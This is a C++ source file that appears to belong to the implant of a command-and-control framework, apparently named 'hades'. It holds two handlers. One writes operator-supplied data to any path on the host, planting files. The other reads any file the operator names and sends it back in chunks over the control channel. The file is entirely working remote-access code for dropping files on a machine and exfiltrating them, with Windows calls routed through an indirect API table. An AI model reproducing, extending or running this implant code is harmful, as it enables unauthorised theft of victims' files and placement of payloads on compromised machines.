#include "cmds.hpp"

void commanders::do_download() {
	HANDLE hFie = NULL;
	PCHAR Path = NULL;
	PBYTE Buf = NULL;

	UINT DataSize = 0;
	UINT PathLen = 0;

	UINT taskID = g_ByteMgr->BeginTask();
	UINT type = g_ByteMgr->Read4();

	if (type == UPLOAD_START_NON_CHUNKED || type == UPLOAD_START_CHUNKED) {
		PathLen = g_ByteMgr->Read4();
		Path = g_ByteMgr->ReadString(PathLen);
		hFie = hades->WinApis.CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFie == INVALID_HANDLE_VALUE) {
			UINT Size = g_ByteMgr->Read4();
			g_ByteMgr->Skip(Size);
			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
			goto CLEANUP;
		}
	}
	else {
		hFie = g_FileMgr->GetHandle(taskID);
	}
	DataSize = g_ByteMgr->Read4();
	Buf = (PBYTE)g_ByteMgr->ReadString(DataSize);
	if (!hades->WinApis.WriteFile(hFie, Buf, DataSize, NULL, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	if (type == UPLOAD_START_CHUNKED) {
		g_FileMgr->InsertTask(taskID, hFie, FileUpload);
	}
	else if (type == TS_UPLOAD_DONE || type == UPLOAD_START_NON_CHUNKED) {
		hades->WinApis.CloseHandle(hFie);
		g_ByteMgr->EndOk(DOWNLOAD_SUCCESS);
		if (type == TS_UPLOAD_DONE) { g_FileMgr->RemoveTask(taskID); }

	}


CLEANUP:
	if (Path) { HeapFree(GetProcessHeap(), 0, Path); }
	if (Buf) { HeapFree(GetProcessHeap(), 0, Buf); }
	return;
}

void commanders::do_upload() {
	HANDLE hFile = NULL;
	PBYTE buf = NULL;

	ULONGLONG size = 0;
	DWORD high = 0;
	DWORD low = 0;
	DWORD chunksize = FILE_CHUNK_SIZE;
	DWORD BytesRead = 0;

	UINT TaskID = g_ByteMgr->BeginTask();

	UINT FileStrLen = g_ByteMgr->Read4();
	PCHAR File = g_ByteMgr->ReadString(FileStrLen);

	hFile = hades->WinApis.CreateFileA(File, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	low = GetFileSize(hFile, &high);
	if (low == INVALID_FILE_SIZE && GetTeb()->LastErrorValue != NO_ERROR) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	size = ((ULONGLONG)high << 32) | low;

	buf = AllocMemory<BYTE>(chunksize);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	if (!hades->WinApis.ReadFile(hFile, buf, chunksize, &BytesRead, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_UPLOAD);

	if (size > chunksize) {
		g_ByteMgr->Write4(UPLOAD_CHUNKED);
		//g_ByteMgr->Write8(size);
		g_ByteMgr->Write4(BytesRead);
		g_ByteMgr->WriteString(buf, BytesRead);

		if (!g_FileMgr->InsertTask(TaskID, hFile, FileDownload)) {
			g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
			goto CLEANUP;
		}

		hFile = NULL;
	}
	else {
		g_ByteMgr->Write4(UPLOAD_NO_CHUNKED);
		//g_ByteMgr->Write8(size);
		g_ByteMgr->Write4(BytesRead);
		g_ByteMgr->WriteString(buf, BytesRead);
	}

CLEANUP:
	if (File) { g_ByteMgr->FreeString(File); }
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile && hFile != INVALID_HANDLE_VALUE) { hades->WinApis.CloseHandle(hFile); }
}